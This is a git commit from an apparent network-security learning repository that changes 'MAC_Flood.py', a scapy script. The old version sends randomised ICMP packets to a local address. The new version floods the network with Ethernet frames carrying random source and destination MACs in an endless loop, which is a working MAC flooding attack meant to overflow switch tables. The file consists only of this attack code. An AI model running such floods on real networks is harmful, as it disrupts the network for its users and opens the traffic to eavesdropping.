dc9fb13e75c24a5bf9cab0200c4e8ec52f4feff1
醉梦半醒 <zmbxzrq@outlook.com>
2018-04-21 15:59:41 +0800

    ？？？？

--- network security/MAC_Flood.py
+++ network security/MAC_Flood.py
@@ -1,3 +1,3 @@
 from scapy.all import *
-pkt=Ether(src=RandMAC())/IP(dst='192.168.1.2',src=RandIP('192.168.1.*'))/ICMP()
-sendp(pkt,loop=0,count=1000)
+pkt=Ether(src=RandMAC(),dst=RandMAC())
+sendp(pkt,loop=1)
